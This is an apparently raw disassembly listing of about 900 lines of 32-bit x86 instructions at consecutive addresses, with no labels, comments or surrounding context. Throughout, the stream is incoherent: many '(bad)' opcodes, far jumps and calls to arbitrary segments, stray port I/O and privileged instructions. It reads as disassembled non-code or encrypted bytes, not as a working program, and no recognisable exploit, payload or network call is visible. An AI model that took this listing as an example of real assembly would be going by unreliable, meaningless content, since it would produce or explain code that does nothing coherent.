  410059:	ja     0x4100ab
  41005b:	dec    ebp
  41005c:	pop    es
  41005d:	sub    eax,0x46b1fc7
  410062:	inc    esp
  410063:	add    eax,0x61f76839
  410068:	inc    ebx
  410069:	aas    
  41006a:	add    al,0x7f
  41006c:	fld    TBYTE PTR [esi]
  41006e:	(bad)  
  41006f:	cld    
  410070:	jmp    0x41009b
  410072:	loopne 0x41006e
  410074:	pop    es
  410075:	(bad)  
  410076:	out    0x38,al
  410078:	sbb    BYTE PTR ds:0xf610b20d,0x43
  41007f:	xor    al,0xe2
  410081:	inc    ecx
  410082:	stos   BYTE PTR es:[edi],al
  410083:	fwait
  410084:	sub    al,0xe9
  410086:	jmp    0x1b39:0x78f55755
  41008d:	xlat   BYTE PTR ds:[ebx]
  41008e:	mov    ch,0x95
  410090:	into   
  410091:	rcr    DWORD PTR [esp+ebx*8-0x224fa01a],0xac
  410099:	popf   
  41009a:	aaa    
  41009b:	daa    
  41009c:	and    dl,BYTE PTR [ebp-0x3a]
  41009f:	sbb    BYTE PTR [edi-0x2dcd996a],dh
  4100a5:	sbb    eax,0x8f902b88
  4100aa:	xor    dh,ah
  4100ac:	ret    
  4100ad:	pop    ds
  4100ae:	dec    ebx
  4100af:	mov    eax,ds:0xf532724e
  4100b4:	jge    0x41012a
  4100b6:	imul   esp,DWORD PTR [esi],0x9f5f5970
  4100bc:	test   esp,eax
  4100be:	call   0x1a37:0xe4f5975a
  4100c5:	loop   0x41007c
  4100c7:	dec    eax
  4100c8:	jne    0x41008e
  4100ca:	inc    edi
  4100cb:	enter  0xe0aa,0xd2
  4100cf:	aas    
  4100d0:	and    BYTE PTR [edx+0x3d],0xb9
  4100d4:	mov    dh,0xaf
  4100d6:	pop    eax
  4100d7:	lods   al,BYTE PTR ds:[esi]
  4100d9:	pop    ebp
  4100da:	nop
  4100db:	and    edi,edi
  4100dd:	mov    ds:0xf57b51ea,eax
  4100e2:	mov    al,ds:0xcf75d97f
  4100e7:	jmp    0x501a:0xd65cb180
  4100ee:	icebp  
  4100ef:	push   0x2c05ac9f
  4100f4:	cmp    edi,0xfffffff2
  4100f7:	lods   al,BYTE PTR ds:[esi]
  4100f8:	pop    esp
  4100f9:	and    bh,0xf3
  4100fc:	sub    al,0x6f
  4100fe:	xchg   ebx,eax
  4100ff:	sub    ah,dh
  410101:	inc    edi
  410102:	jae    0x41012a
  410104:	sbb    esi,DWORD PTR [edi+0x5a]
  410107:	cmp    esp,DWORD PTR [edx-0x3f]
  41010a:	pusha  
  41010b:	mov    eax,ecx
  41010d:	out    0xc2,eax
  41010f:	fistp  DWORD PTR [ecx+0x54c770a7]
  410115:	fwait
  410116:	js     0x410158
  410118:	pushf  
  410119:	sbb    edx,esp
  41011b:	xchg   esp,eax
  41011c:	mov    esi,?
  41011e:	sbb    al,0xb8
  410120:	cmc    
  410121:	or     al,0x6e
  410123:	es pusha 
  410125:	inc    edx
  410126:	jb     0x4100c5
  410128:	lds    esi,FWORD PTR ds:0xc4fc8c96
  41012e:	retf   
  41012f:	fadd   st,st(0)
  410131:	rol    dh,1
  410133:	and    dl,BYTE PTR [ebp+0x47]
  410136:	jmp    0xc0c2:0x6df948dc
  41013d:	je     0x4100dc
  41013f:	pop    ecx
  410140:	mov    eax,0x639b687e
  410145:	retf   0x26a8
  410148:	jbe    0x410176
  41014a:	mov    ah,0x70
  41014c:	enter  0xea5,0x73
  410150:	retf   
  410151:	sub    al,0xd8
  410153:	popf   
  410154:	popf   
  410155:	mov    ah,0x6e
  410157:	mov    ds:0x4a75803c,al
  41015c:	(bad)  
  41015e:	ss int3 
  410160:	mov    eax,ds:0x63552853
  410165:	adc    eax,0x8b365a61
  41016a:	adc    eax,0xcf5dadd8
  41016f:	out    dx,al
  410170:	xchg   ebx,eax
  410171:	and    eax,0xefde289a
  410176:	stos   BYTE PTR es:[edi],al
  410177:	inc    esi
  410178:	(bad)  
  410179:	mov    DWORD PTR [ebx+0x58],esp
  41017c:	adc    eax,0xc46b121d
  410181:	adc    DWORD PTR [ecx+0x5f],ebx
  410184:	fstp   DWORD PTR [ecx+0x29184d82]
  41018a:	pop    ds
  41018b:	xchg   ebp,edi
  41018d:	popf   
  41018e:	jo     0x410149
  410190:	inc    ecx
  410191:	pusha  
  410192:	in     al,0x63
  410194:	sub    edi,DWORD PTR [edx]
  410196:	or     al,0x4c
  410198:	dec    eax
  410199:	push   esi
  41019a:	xor    DWORD PTR ds:0x8f1f738a,edi
  4101a0:	xor    eax,0x1dcd8950
  4101a5:	fcom   st(3)
  4101a7:	pop    esp
  4101a8:	cld    
  4101a9:	mov    ecx,0x64c79f68
  4101ae:	pop    eax
  4101af:	xchg   ebp,eax
  4101b0:	xchg   DWORD PTR [edx-0x6e],esp
  4101b3:	imul   edi
  4101b5:	es (bad) 
  4101b7:	and    BYTE PTR [edx],ch
  4101b9:	popa   
  4101ba:	shl    DWORD PTR [edi],0x69
  4101bd:	adc    ch,BYTE PTR [ebp-0x5d]
  4101c0:	push   eax
  4101c1:	(bad)  
  4101c2:	cld    
  4101c3:	mov    bh,0x72
  4101c5:	stc    
  4101c6:	ins    DWORD PTR es:[edi],dx
  4101c7:	out    0x20,eax
  4101c9:	jns    0x4101df
  4101cb:	bound  edx,QWORD PTR [ecx-0x4364ecdf]
  4101d1:	jns    0x41023d
  4101d3:	sub    ebx,esp
  4101d5:	hlt    
  4101d6:	pop    esi
  4101d7:	sub    al,0xe1
  4101d9:	call   0x7ba7:0x9b97deb5
  4101e0:	sahf   
  4101e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101e2:	pop    esp
  4101e3:	cmp    BYTE PTR [esi],bh
  4101e5:	ins    DWORD PTR es:[edi],dx
  4101e6:	or     al,0xc2
  4101e8:	add    al,0x10
  4101ea:	sub    eax,0xfcc2657e
  4101ef:	iret   
  4101f0:	retf   
  4101f1:	outs   dx,BYTE PTR ds:[esi]
  4101f2:	jmp    0x34836176
  4101f7:	mov    bl,0x2
  4101f9:	fcomip st,st(1)
  4101fb:	sar    BYTE PTR [ecx],1
  4101fd:	or     DWORD PTR [edi+0x47],esp
  410200:	add    DWORD PTR [ebp-0x5ef9fc00],0x616ba582
  41020a:	bound  ebx,QWORD PTR [edi+0x69117250]
  410210:	sub    eax,0x534ceade
  410215:	fsub   st,st(6)
  410217:	dec    edx
  410218:	out    dx,eax
  410219:	xor    ecx,esp
  41021b:	pause  
  41021d:	shr    BYTE PTR [ecx+0x77],cl
  410220:	or     edi,DWORD PTR [esi-0x616e1d61]
  410226:	ffree  st(2)
  410228:	dec    edi
  410229:	popa   
  41022a:	mov    fs,WORD PTR [edi-0x3d38b4d]
  410230:	inc    edi
  410231:	or     BYTE PTR [edx-0x5f],dl
  410234:	in     eax,0xd8
  410236:	pop    ebx
  410237:	xchg   ebx,eax
  410238:	popf   
  410239:	add    al,0x19
  41023b:	mov    dl,0x32
  41023d:	pop    ss
  41023e:	push   ebp
  41023f:	inc    ebx
  410240:	fadd   st,st(5)
  410242:	test   eax,0xa293988a
  410247:	fcomp  DWORD PTR ds:0xfb63c273
  41024d:	jns    0x41024a
  41024f:	adc    eax,0xa5a53bbd
  410254:	cmp    ebx,edx
  410256:	test   al,0xeb
  410258:	push   ss
  410259:	scas   al,BYTE PTR es:[edi]
  41025a:	push   es
  41025b:	mov    DWORD PTR [ebx+eax*4],0x3931ea10
  410262:	push   ss
  410263:	outs   dx,DWORD PTR ds:[esi]
  410264:	in     eax,0x67
  410266:	or     BYTE PTR [ebp-0x3f],ah
  410269:	hlt    
  41026a:	int3   
  41026b:	cmp    ebx,DWORD PTR [edi]
  41026d:	js     0x410243
  41026f:	cmp    dl,BYTE PTR [edi-0x4b0a691a]
  410275:	mov    esp,0xbd50ef40
  41027a:	imul   edi,DWORD PTR fs:[ebx+0x3f],0xffffffe6
  41027f:	stos   DWORD PTR es:[edi],eax
  410280:	dec    edi
  410281:	mov    edx,0x9583a687
  410286:	icebp  
  410287:	jecxz  0x41027f
  410289:	aas    
  41028a:	jl     0x4102ef
  41028c:	mov    esi,0x41439cba
  410291:	aad    0xde
  410293:	arpl   sp,di
  410295:	adc    eax,0xa5c20b60
  41029a:	jmp    0xc116:0xeadc64be
  4102a1:	fisttp QWORD PTR [esi-0x69316cb4]
  4102a7:	ins    DWORD PTR es:[edi],dx
  4102a8:	cmp    al,0xb5
  4102aa:	retf   0x7b9c
  4102ad:	mov    ds:0xe3982799,al
  4102b2:	in     al,0x12
  4102b4:	out    dx,al
  4102b5:	fiadd  WORD PTR [esi+0x70]
  4102b8:	std    
  4102b9:	push   eax
  4102ba:	js     0x4102ab
  4102bc:	das    
  4102bd:	rcr    BYTE PTR [edx],0x9
  4102c0:	sub    DWORD PTR [esi+ebp*8-0x73],ecx
  4102c4:	daa    
  4102c5:	adc    BYTE PTR [eax+edx*1+0x19],cl
  4102c9:	les    esi,FWORD PTR es:[eax]
  4102cc:	icebp  
  4102cd:	stos   DWORD PTR es:[edi],eax
  4102ce:	mov    ds:0xc8913f38,al
  4102d3:	test   BYTE PTR [eax+0x272f278e],ch
  4102d9:	ror    DWORD PTR ds:[eax-0x61],0xb
  4102de:	push   edi
  4102df:	xor    al,ah
  4102e1:	in     eax,dx
  4102e2:	fdiv   DWORD PTR [eax+0x4a]
  4102e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102e6:	jg     0x410291
  4102e8:	neg    bl
  4102ea:	dec    esi
  4102eb:	xchg   BYTE PTR [edx],dh
  4102ed:	loope  0x4102d6
  4102ef:	or     bh,al
  4102f1:	xor    dl,BYTE PTR [ecx+0x30f91aa]
  4102f7:	std    
  4102f8:	cld    
  4102f9:	push   es
  4102fa:	pop    es
  4102fb:	ins    BYTE PTR es:[edi],dx
  4102fc:	dec    edi
  4102fd:	push   esp
  4102fe:	push   ebx
  4102ff:	pusha  
  410300:	lahf   
  410301:	(bad)  
  410303:	jbe    0x410323
  410305:	imul   esi,DWORD PTR [eax+edi*1+0x40a0cc3c],0x16cc90a1
  410310:	rcr    esp,cl
  410312:	ja     0x410295
  410314:	add    ebp,DWORD PTR [eax+0x59]
  410317:	in     al,dx
  410318:	push   edx
  410319:	int3   
  41031a:	lahf   
  41031b:	sub    BYTE PTR [ebp-0x6e7ac704],ah
  410321:	push   esp
  410322:	sub    BYTE PTR [eax+esi*4-0x7e],ch
  410326:	jge    0x410359
  410328:	mov    dl,0xdf
  41032a:	inc    eax
  41032b:	pop    ds
  41032c:	dec    edx
  41032d:	mov    bl,0x91
  41032f:	fdivr  QWORD PTR [eax-0x20]
  410332:	in     eax,0x9e
  410334:	pop    ebp
  410335:	mov    ebx,0x43138df0
  41033a:	and    DWORD PTR [edi+0x69],ecx
  41033d:	mov    ds:0x9c1e9ffe,al
  410342:	imul   ebp,ebp,0xb2fef5c0
  410348:	jnp    0x4102d7
  41034a:	jmp    0x4102e1
  41034c:	rcr    bh,0xc7
  41034f:	inc    ebx
  410350:	cwde   
  410351:	comiss xmm4,DWORD PTR [esi+edx*2+0x7f]
  410356:	pop    eax
  410357:	aas    
  410358:	rcr    BYTE PTR [esi+esi*4-0x4c],cl
  41035c:	add    al,0xff
  41035e:	pusha  
  41035f:	xchg   DWORD PTR [esi],ecx
  410361:	call   0xcfeb:0x9aca42cb
  410368:	or     eax,0x6da91359
  41036d:	and    eax,0x4a20da36
  410372:	mov    bl,0xd5
  410374:	mov    eax,0xec7c3b5e
  410379:	or     dh,BYTE PTR [ecx+0x9]
  41037c:	mov    BYTE PTR [ebx-0x5b],dl
  41037f:	push   edx
  410380:	or     cl,BYTE PTR [esi-0x4e8a90ea]
  410386:	retf   
  410387:	mov    eax,ds:0xb73f843a
  41038c:	lods   eax,DWORD PTR ds:[esi]
  41038d:	repz (bad) 
  41038f:	sub    BYTE PTR [edx-0x2a3ff7c8],cl
  410395:	fdivr  st,st(1)
  410397:	xor    DWORD PTR gs:[edi-0x7],edi
  41039b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41039c:	adc    edi,DWORD PTR [eax-0x8798f89]
  4103a2:	mov    edi,0x362d301b
  4103a7:	lahf   
  4103a8:	mov    dl,0x2b
  4103aa:	sub    eax,0x6a336e4f
  4103af:	fsubr  st,st(5)
  4103b1:	enter  0x32f7,0x9
  4103b5:	mov    esp,0x55af7f4f
  4103ba:	push   ss
  4103bb:	sbb    eax,0x68aa51c1
  4103c0:	rol    BYTE PTR [eax+0x5fd4f76],cl
  4103c6:	pop    ds
  4103c7:	adc    esp,DWORD PTR [esi-0x6f]
  4103ca:	mov    es,WORD PTR [ebx]
  4103cc:	and    eax,0x72159f3d
  4103d1:	(bad)  
  4103d3:	dec    ecx
  4103d4:	xor    BYTE PTR [eax],dh
  4103d6:	aaa    
  4103d7:	shl    BYTE PTR [edi],1
  4103d9:	ret    0x24e
  4103dc:	mov    DWORD PTR [ecx+0x52c874ab],ebx
  4103e2:	pop    edx
  4103e3:	js     0x410406
  4103e5:	les    ecx,FWORD PTR [edx+0x4e5c9f96]
  4103eb:	fidivr WORD PTR [ecx+ebx*8-0x48]
  4103ef:	adc    DWORD PTR [eax+0x748f493f],ebp
  4103f5:	out    0x8d,eax
  4103f7:	dec    ecx
  4103f8:	dec    ebp
  4103f9:	dec    edx
  4103fa:	pop    eax
  4103fb:	xchg   ebp,eax
  4103fc:	or     ebp,DWORD PTR [esi]
  4103fe:	test   ah,ah
  410400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410401:	test   eax,0x40f8fc82
  410406:	jmp    0xdcb7:0x4debeefe
  41040d:	add    eax,0xb612ca0b
  410412:	push   esp
  410413:	and    DWORD PTR [edi+0x160f8dee],ecx
  410419:	sbb    ebx,DWORD PTR [ebx-0x5a]
  41041c:	jmp    0x410454
  41041e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41041f:	fwait
  410420:	cmp    BYTE PTR [esi],ch
  410422:	ret    
  410423:	and    al,0x3e
  410425:	sub    eax,0xb869e50b
  41042a:	inc    esi
  41042b:	push   ebx
  41042c:	das    
  41042d:	cmp    esi,ebx
  41042f:	ins    DWORD PTR es:[edi],dx
  410430:	pop    esp
  410431:	jns    0x410488
  410433:	xlat   BYTE PTR ds:[ebx]
  410434:	cmp    eax,0x99e6d3c
  410439:	inc    edi
  41043a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41043b:	nop
  41043c:	(bad)  
  41043d:	inc    DWORD PTR [edx]
  41043f:	add    DWORD PTR [ebp+0x20],0x304f0922
  410446:	ins    BYTE PTR es:[edi],dx
  410447:	rcr    DWORD PTR [eax],cl
  410449:	xor    ebx,DWORD PTR [esi+0x2a]
  41044c:	or     al,0xfb
  41044e:	add    eax,esi
  410450:	xchg   ebx,eax
  410451:	loopne 0x4103df
  410453:	in     al,dx
  410454:	jecxz  0x4103e6
  410456:	bound  eax,QWORD PTR [ecx+0x52610b90]
  41045c:	mov    cl,0x4c
  41045e:	imul   edx,DWORD PTR [edx+ebx*2+0x686da4c7],0x159d9013
  410469:	(bad)  
  41046a:	push   esi
  41046b:	cmc    
  41046c:	sub    DWORD PTR [esi+0x47],edi
  41046f:	cmp    DWORD PTR [esi-0x37],eax
  410472:	and    DWORD PTR [ebx],eax
  410474:	adc    BYTE PTR [ecx+0x203ad048],ch
  41047a:	lea    ebp,[ecx+edi*2-0x60a12cc0]
  410481:	pop    edi
  410482:	repz rol DWORD PTR [ecx-0x7acbffe5],cl
  410489:	(bad)  
  41048a:	repz retf 
  41048c:	stc    
  41048d:	pop    edi
  41048e:	jo     0x4104b9
  410490:	push   ebx
  410491:	sub    edi,esp
  410493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410494:	push   ecx
  410495:	inc    eax
  410496:	shl    BYTE PTR [ecx-0x10],1
  410499:	sbb    eax,0xc2893a4
  41049e:	dec    esi
  41049f:	stos   DWORD PTR es:[edi],eax
  4104a0:	ins    BYTE PTR es:[edi],dx
  4104a1:	scas   al,BYTE PTR es:[edi]
  4104a2:	jp     0x4104ab
  4104a4:	ror    BYTE PTR [ebp+0x7d],cl
  4104a7:	arpl   WORD PTR [eax+0x61cdde55],dx
  4104ad:	jns    0x4104de
  4104af:	not    DWORD PTR [eax+0x451dc514]
  4104b5:	dec    eax
  4104b6:	xor    al,0x32
  4104b8:	int3   
  4104b9:	push   edx
  4104ba:	xchg   DWORD PTR [ecx],ecx
  4104bc:	push   ds
  4104bd:	dec    esp
  4104be:	pop    ecx
  4104bf:	mov    eax,0x2853fadc
  4104c4:	fdiv   st(0),st
  4104c6:	mov    dl,0xb
  4104c8:	mov    ebx,0xdd472dbc
  4104cd:	(bad)  
  4104ce:	xor    al,0x32
  4104d0:	test   DWORD PTR [edx-0x4e],0x7718caa
  4104d7:	ja     0x4104d3
  4104d9:	or     bh,bh
  4104db:	adc    DWORD PTR [esi+ecx*2],ebx
  4104de:	and    BYTE PTR [eax-0x1abbb0a9],ch
  4104e4:	jne    0x410500
  4104e6:	pop    es
  4104e7:	jno    0x410564
  4104e9:	adc    DWORD PTR [edi+0x25],edx
  4104ec:	inc    edi
  4104ed:	test   DWORD PTR [ebx+edi*4+0x45],eax
  4104f1:	mov    ds:0x4b5c39f,al
  4104f6:	fcomp  QWORD PTR [edi-0x15b64b68]
  4104fc:	ds leave 
  4104fe:	mov    ecx,0xdef7df37
  410503:	and    BYTE PTR [esi-0x21],bl
  410506:	pop    eax
  410507:	pusha  
  410508:	jge    0x4104eb
  41050a:	inc    edx
  41050b:	pop    esp
  41050c:	or     eax,0xe6b5615e
  410511:	shr    BYTE PTR [edx],0x0
  410514:	icebp  
  410515:	dec    esp
  410516:	mov    ch,0x13
  410518:	jl     0x4104f5
  41051a:	or     eax,DWORD PTR [esi]
  41051c:	imul   ebx,DWORD PTR [edi+0x69],0xffffffbf
  410520:	lock addr16 leave 
  410523:	lds    ebx,FWORD PTR [eax+0x5e7a078d]
  410529:	fimul  DWORD PTR cs:[ebp+0x12]
  41052d:	and    al,0xad
  41052f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410530:	inc    ebp
  410531:	push   ebp
  410532:	inc    ecx
  410533:	cmp    al,bh
  410535:	dec    ebx
  410536:	sbb    DWORD PTR [edi],0x3ddbbc5
  41053c:	enter  0xe73a,0x94
  410540:	jo     0x410579
  410542:	dec    edi
  410543:	mov    ds:0xe13dcae8,al
  410548:	xchg   ebx,eax
  410549:	ret    0x5032
  41054c:	cmp    DWORD PTR [ecx+eax*2-0x39],esp
  410550:	cmp    DWORD PTR [edx],ecx
  410552:	adc    eax,0xb7b6e641
  410557:	sub    eax,DWORD PTR [edx-0x27]
  41055a:	frstor [esi+0x7dfa5ea8]
  410560:	stc    
  410561:	xor    esi,DWORD PTR [ebp+0x70]
  410564:	add    al,0x31
  410566:	adc    al,0x1c
  410568:	push   0x25
  41056a:	mov    edi,0xab527d26
  41056f:	xchg   edx,eax
  410570:	pop    ebp
  410571:	inc    eax
  410573:	mov    cl,0xdc
  410575:	dec    esp
  410576:	hlt    
  410577:	xor    ch,BYTE PTR ds:0xdf37db68
  41057d:	dec    ecx
  41057e:	adc    dl,BYTE PTR [ecx]
  410580:	push   ebx
  410581:	ja     0x4105e7
  410583:	sub    edx,DWORD PTR [edx]
  410585:	fsub   DWORD PTR [bx+0x4e]
  410589:	and    edx,DWORD PTR [esi-0x2b9f9023]
  41058f:	sbb    BYTE PTR [edx+0x20],al
  410592:	adc    eax,0x3825a84a
  410597:	xor    ecx,DWORD PTR [edx-0x6a]
  41059a:	sub    BYTE PTR [eax],cl
  41059c:	iret   
  41059d:	sar    BYTE PTR [edi+0x90eec02],cl
  4105a3:	jmp    0x41061a
  4105a5:	jmp    0x410599
  4105a7:	cmc    
  4105a8:	and    al,0x12
  4105aa:	out    0x16,al
  4105ac:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4105ae:	xchg   ebp,eax
  4105af:	lds    ecx,FWORD PTR [eax-0x43928c22]
  4105b5:	enter  0x3cfe,0xe0
  4105b9:	cld    
  4105ba:	repnz test al,0x96
  4105bd:	repz inc eax
  4105bf:	sub    BYTE PTR [edi+ecx*2],ah
  4105c2:	fmul   st,st(3)
  4105c4:	enter  0xb3db,0x8d
  4105c8:	sub    al,0x30
  4105ca:	(bad)
  4105cd:	out    0xe0,eax
  4105cf:	adc    al,0xfd
  4105d1:	pusha  
  4105d2:	jp     0x4105e5
  4105d4:	mov    ?,WORD PTR [ecx-0x5d]
  4105d7:	ss mov al,0x8f
  4105da:	xor    BYTE PTR [edx],0x2e
  4105dd:	add    DWORD PTR [eax-0x10467ce4],esi
  4105e3:	pop    ebx
  4105e4:	cmp    eax,0x4e171179
  4105e9:	out    0xbb,eax
  4105eb:	cmc    
  4105ec:	mov    eax,DWORD PTR [edi]
  4105ee:	lock dec edi
  4105f0:	pushf  
  4105f1:	fucom  st(3)
  4105f3:	out    0x87,al
  4105f5:	clc    
  4105f6:	push   esp
  4105f7:	add    al,0xcf
  4105f9:	mov    es,ebp
  4105fb:	sub    BYTE PTR [esi-0x47],bh
  4105fe:	cld    
  4105ff:	stos   DWORD PTR es:[edi],eax
  410600:	cmp    DWORD PTR [eax],edi
  410602:	in     eax,0x9f
  410604:	dec    esi
  410605:	fisttp WORD PTR [edx+ecx*4-0x62e73b38]
  41060c:	loopne 0x41063d
  41060e:	jp     0x410611
  410610:	sub    BYTE PTR [ecx+0x4d],0x96
  410614:	and    DWORD PTR [edx],0xc14e7050
  41061a:	mov    esi,0x27c4f6f
  41061f:	jmp    0x410693
  410621:	mov    esi,0xc9306f55
  410626:	mov    eax,ds:0xd9d60f3c
  41062b:	mov    esi,0x32e78928
  410630:	inc    esi
  410631:	adc    DWORD PTR [esi+0x1d],edx
  410634:	arpl   WORD PTR [ecx-0x42],cx
  410637:	mov    ecx,ecx
  410639:	xor    eax,0x1d998c31
  41063e:	sub    ah,BYTE PTR [edx+edi*2+0x2d]
  410642:	xor    eax,0x1a945813
  410647:	and    esp,edi
  410649:	inc    ebx
  41064a:	lods   eax,DWORD PTR ds:[esi]
  41064b:	idiv   DWORD PTR [esi-0x42]
  41064e:	das    
  41064f:	sbb    ch,0xc6
  410652:	ja     0x410684
  410654:	cmp    bl,bh
  410656:	mov    ecx,0x9e813124
  41065b:	sub    eax,0xf5bd56d2
  410660:	jb     0x4106d6
  410662:	or     eax,0x3e518f4d
  410667:	xchg   esp,eax
  410668:	xchg   ecx,eax
  410669:	and    dl,BYTE PTR [edi+0x29]
  41066c:	inc    eax
  41066d:	pusha  
  41066e:	std    
  41066f:	into   
  410670:	std    
  410671:	fdivr  DWORD PTR [ecx]
  410673:	jns    0x410603
  410675:	or     al,0x9e
  410677:	daa    
  410678:	(bad)  
  410679:	push   ebp
  41067a:	jmp    0xc720dc89
  41067f:	sbb    eax,0x2c084016
  410684:	sub    bh,bl
  410686:	pop    esp
  410687:	add    al,0xbd
  410689:	cmc    
  41068a:	sbb    eax,0xe89ccca5
  41068f:	push   esi
  410690:	mov    ds:0x2de0c857,al
  410695:	push   eax
  410696:	test   al,0xec
  410698:	inc    ebx
  410699:	rcl    ch,cl
  41069b:	pop    ebx
  41069c:	push   eax
  41069d:	or     DWORD PTR [edi],0x58
  4106a0:	or     eax,0x8c9e02ef
  4106a5:	add    edx,edx
  4106a7:	in     eax,0xe
  4106a9:	mov    eax,0xa784ea2a
  4106ae:	mul    BYTE PTR [edx+0x3a5468fa]
  4106b4:	push   0xffffffd2
  4106b6:	bnd je 0x41067b
  4106b9:	or     al,al
  4106bb:	jmp    0x1eb1:0xf279adc1
  4106c2:	arpl   WORD PTR [edi+ecx*2+0x4f],sp
  4106c6:	stc    
  4106c7:	and    DWORD PTR ds:[ecx+0x1354d11],esi
  4106ce:	jo     0x410688
  4106d0:	fcmove st,st(2)
  4106d2:	xlat   BYTE PTR ds:[ebx]
  4106d3:	fadd   QWORD PTR [edi]
  4106d5:	ins    BYTE PTR es:[edi],dx
  4106d6:	mov    cl,0x3f
  4106d8:	out    0xbd,al
  4106da:	mov    ebx,0x91de9682
  4106df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106e0:	sbb    eax,ebp
  4106e2:	stc    
  4106e3:	dec    ebx
  4106e4:	test   al,0x1
  4106e6:	or     dl,bh
  4106e8:	jmp    0x410687
  4106ea:	inc    ebp
  4106eb:	sub    bh,dh
  4106ed:	dec    esp
  4106ee:	iret   
  4106ef:	pop    edi
  4106f0:	inc    esp
  4106f1:	gs mov cl,0x2b
  4106f4:	mov    DWORD PTR [edi],ebx
  4106f6:	retf   
  4106f7:	xor    ebx,DWORD PTR gs:[ebp+0x20ab181d]
  4106fe:	mov    ebx,0x4c10c04c
  410703:	push   edi
  410704:	xchg   ecx,eax
  410705:	pop    esp
  410706:	mov    DWORD PTR [ecx],edi
  410708:	mov    al,0x28
  41070a:	(bad)
  41070e:	pop    esi
  41070f:	dec    edx
  410710:	addr16 sar ecx,1
  410713:	in     eax,dx
  410714:	out    0xc6,al
  410716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410717:	lds    eax,FWORD PTR [ecx]
  410719:	mov    al,0xab
  41071b:	out    dx,eax
  41071c:	aam    0x88
  41071e:	repnz in eax,0x2a
  410721:	fidivr WORD PTR [esi+eiz*8-0x5ed9f7e]
  410728:	std    
  410729:	pop    edx
  41072a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41072b:	push   ss
  41072c:	push   ebp
  41072d:	lahf   
  41072e:	mov    esi,0x1194fa2b
  410733:	mov    cl,0xad
  410735:	fcomp  DWORD PTR [ebx+0x45ca2ddc]
  41073b:	lahf   
  41073c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41073d:	add    BYTE PTR [eax-0x60],ah
  410740:	into   
  410741:	out    dx,eax
  410742:	aaa    
  410743:	jne    0x41075b
  410745:	add    BYTE PTR [ebx+0x3a5a3b2c],bh
  41074b:	adc    esi,DWORD PTR [esi+edx*8]
  41074e:	xor    BYTE PTR [esi],bl
  410750:	jo     0x4106da
  410752:	sbb    DWORD PTR ds:0x5d69a29a,ecx
  410758:	jg     0x410780
  41075a:	ins    DWORD PTR es:[edi],dx
  41075b:	imul   edi,DWORD PTR [esi-0x1c],0xc63a2495
  410762:	test   eax,0xae7b8d15
  410767:	inc    eax
  410768:	mov    dh,0x89
  41076a:	adc    dh,BYTE PTR [ecx+0x17303af5]
  410770:	hlt    
  410771:	xchg   esi,eax
  410772:	leave  
  410773:	out    0x30,al
  410775:	add    eax,0x50fc7bba
  41077a:	in     al,dx
  41077b:	jb     0x4107cb
  41077d:	xor    eax,DWORD PTR [esi]
  41077f:	popa   
  410780:	lds    eax,FWORD PTR [ebx]
  410782:	data16 xlat BYTE PTR ds:[ebx]
  410784:	or     DWORD PTR ds:0x338523ce,esi
  41078a:	and    ebp,DWORD PTR [ecx+eiz*4]
  41078d:	jne    0x4107d1
  41078f:	popa   
  410790:	enter  0xed02,0xe9
  410794:	or     bl,BYTE PTR [esi+0x16]
  410797:	scas   eax,DWORD PTR es:[edi]
  410798:	mov    ds:0xf06e866c,eax
  41079d:	ror    ebx,0xe0
  4107a0:	out    0xe8,eax
  4107a2:	inc    edx
  4107a3:	xchg   BYTE PTR [edi+edx*8],bl
  4107a6:	ret    0xbcda
  4107a9:	push   0xdd3b9f94
  4107ae:	hlt    
  4107af:	jmp    0x69ec:0x4f808bab
  4107b6:	mov    eax,ds:0x8c1e67ec
  4107bb:	sahf   
  4107bc:	out    0xc8,al
  4107be:	adc    ebp,DWORD PTR [ebx-0x73]
  4107c1:	mov    WORD PTR [ecx-0x56],gs
  4107c4:	pop    ss
  4107c5:	or     eax,0x8a38e8c5
  4107ca:	fld    QWORD PTR [ebx+0x2b]
  4107cd:	jl     0x41079b
  4107cf:	or     al,0xf3
  4107d1:	shr    BYTE PTR [ecx+ebx*8+0x2d3834b0],cl
  4107d8:	pop    eax
  4107d9:	push   0xffffffda
  4107db:	xor    bl,dl
  4107dd:	outs   dx,BYTE PTR ss:[esi]
  4107df:	lahf   
  4107e0:	rcl    DWORD PTR [edi-0x3b],cl
  4107e3:	loope  0x410844
  4107e5:	call   0x1efc68f6
  4107ea:	outs   dx,DWORD PTR ds:[esi]
  4107eb:	and    eax,ebp
  4107ed:	stos   DWORD PTR es:[edi],eax
  4107ee:	sub    ebx,esp
  4107f0:	loop   0x4107b0
  4107f2:	and    al,0xee
  4107f4:	mov    cl,0x0
  4107f6:	inc    esp
  4107f7:	or     BYTE PTR [eax],dl
  4107f9:	sti    
  4107fa:	dec    edi
  4107fb:	push   es
  4107fc:	adc    dl,BYTE PTR [edi]
  4107fe:	aad    0x61
  410800:	mov    edx,0xe96e95bf
  410805:	inc    ebx
  410806:	mov    al,0xc7
  410808:	(bad)  
  410809:	sbb    ecx,DWORD PTR [ecx+0x67]
  41080c:	push   ss
  41080d:	or     al,0xe2
  41080f:	xchg   BYTE PTR [esi-0x41],bh
  410812:	adc    al,0xed
  410814:	shr    bl,0xd8
  410817:	stos   BYTE PTR es:[edi],al
  410818:	pop    ebx
  410819:	in     al,dx
  41081a:	in     al,0x39
  41081c:	fadd   QWORD PTR [ecx-0x5c]
  41081f:	xchg   edi,eax
  410820:	shr    BYTE PTR [edx+ebp*4],1
  410823:	cwde   
  410824:	js     0x41084c
  410826:	push   fs
  410828:	xchg   esi,eax
  410829:	jle    0x410864
  41082b:	popa   
  41082c:	xor    DWORD PTR [esi+ecx*1-0x43f276db],edi
  410833:	shr    BYTE PTR [edi-0x12],cl
  410836:	pop    edi
  410837:	sahf   
  410838:	inc    BYTE PTR [eax]
  41083a:	(bad)  
  41083b:	push   esi
